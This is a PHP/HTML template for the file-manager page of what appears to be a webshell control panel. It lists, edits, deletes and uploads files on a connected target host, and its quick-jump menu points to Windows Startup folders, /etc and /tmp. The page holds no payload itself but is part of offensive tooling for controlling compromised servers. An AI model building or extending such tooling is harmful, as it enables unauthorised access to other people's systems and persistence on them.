<!-- content start -->
  <div class="admin-content">
    <div class="admin-content-body">
      <div class="am-cf am-padding am-padding-bottom-0">
        <div class="am-fl am-cf"><strong class="am-text-primary am-text-lg">Webshell</strong> / <small>文件管理</small></div>
      </div>
      <hr>
		<div class="am-g">
        <div class="am-u-sm-12 am-u-md-4">
          <div class="am-btn-toolbar">
            <div class="am-btn-group am-btn-group-xs">
              <button type="button" class="am-btn am-btn-default" onclick="Inputok('newfile.php','index.php?action=filedit&gid=<?php echo $info["id"]; ?>&path=<?php echo urlencode($rootfile.'/'); ?>');"><span class="am-icon-plus"></span> 新增文件</button>
              <button type="button" class="am-btn am-btn-default"><span class="am-icon-save"></span> 新建目录</button>
              <button type="button" class="am-btn am-btn-default"><span class="am-icon-archive"></span> 上传</button>
            </div>
          </div>
        </div>
		<div class="am-u-sm-12 am-u-md-5">
          <form action="index.php" method="GET">
          <div class="am-input-group am-input-group-sm">
            <input type="text" name="path" class="am-form-field" value="<?php echo $rootfile; ?>">
            <input type="hidden" name="action" value="file">
            <input type="hidden" name="gid" value="<?php echo $info["id"]; ?>">
          <span class="am-input-group-btn">
            <button class="am-btn am-btn-default" type="submit">转到</button>
          </span>
          </div>
          </form>
        </div>
        <div class="am-u-sm-12 am-u-md-3">
          <div class="am-form-group">
            <select data-am-selected="{btnSize: 'sm'}" style="display: none;" onchange="selectSort(this);">
              <option value="<?php echo $rootfile; ?>">本程序目录</option>
              <option value="C:/">C盘</option>
              <option value="D:/">D盘</option>
              <option value="E:/">E盘</option>
              <option value="F:/">F盘</option>
              <option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
              <option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
              <option value="C:/RECYCLER">回收站</option>
              <option value="C:/Program Files">Programs</option>
              <option value="/etc">etc</option>
              <option value="/home">home</option>
              <option value="/usr/local">Local</option>
              <option value="/tmp">Temp</option>
            </select>
          </div>
        </div>
        <script>
          function selectSort(type){
            window.location.href = "index.php?action=file&gid=<?php echo $info["id"]; ?>&path=" + type.value;
          }
          </script>
      </div>
      <div class="am-g">
	 
        <div class="am-u-sm-12">
          <form class="am-form">
            <div id="collapse-panel-2" class="am-collapse am-in">
              <table class="am-table am-table-bd am-table-bdrs am-table-striped am-table-hover">
                <tr>
                <th><input type="checkbox"></th>
                        <th>上级目录</th>
                        <th>操作</th>
                        <th>属性</th>
                <th>修改时间</th>
                <th>大小</th>
                </tr>
                <tbody>
                <?php foreach ($webfile as $key => $value):?>
                <tr>
                <?php if(substr($value["path"], -1)=="/"): ?>
                  <td><img src="./content/views/images/file_open.ico" alt="" style="
    height: 25px;
    width: 35px;
"></td><?php else: ?><td><input type="checkbox"></td><?php endif; ?>
        				  <td><a href="index.php?action=file&gid=<?php echo $info["id"]; ?>&path=<?php echo $rootfile."/".$value["path"]; ?>"><?php echo $value["path"]; ?></a></td>
        				  <td><div class="am-btn-toolbar">
                    <div class="am-btn-group am-btn-group-xs"><a class="am-btn am-btn-default am-btn-xs am-text-secondary" href="index.php?action=filedit&gid=<?php echo $info["id"]; ?>&path=<?php echo $rootfile."\\".$value["path"]; ?>&time=<?php echo $value["time"]; ?>""><span class="am-icon-pencil-square-o"></span> 编辑</a><a class="am-btn am-btn-default am-btn-xs am-text-danger am-hide-sm-only" href="index.php?action=delfile&gid=<?php echo $info["id"]; ?>&path=<?php echo $rootfile."\\".$value["path"]; ?>"><span class="am-icon-trash-o"></span> 删除</a></div></div></td>
                  <td><?php echo $value["root"]; ?></td>                  
                  <td><?php echo $value["time"]; ?></td>
                  <td><?php echo File_Size($value["size"]); ?></td>
                </tr>
              <?php endforeach; ?>
                </tbody>
              </table>
            </div>
            <hr />
            <p>注：.....</p>
          </form>
        </div>

      </div>
    </div>

    <footer class="admin-content-footer">
      <hr>
      <p class="am-padding-left">© 2014 AllMobilize, Inc. Licensed under MIT license.</p>
    </footer>

  </div>
  <!-- content end -->
</div>

<a href="#" class="am-icon-btn am-icon-th-list am-show-sm-only admin-menu" data-am-offcanvas="{target: '#admin-offcanvas'}"></a>

<footer>
  <hr>
  <p class="am-padding-left">© 2014 AllMobilize, Inc. Licensed under MIT license.</p>
</footer>
<script> 
function Inputok(msg,gourl)
  {
    smsg = "当前文件:[" + msg + "]";
    re = prompt(smsg,unescape(msg));
    if(re)
    {
      var url = gourl + escape(re);
      window.location = url;
    }
  }
</script>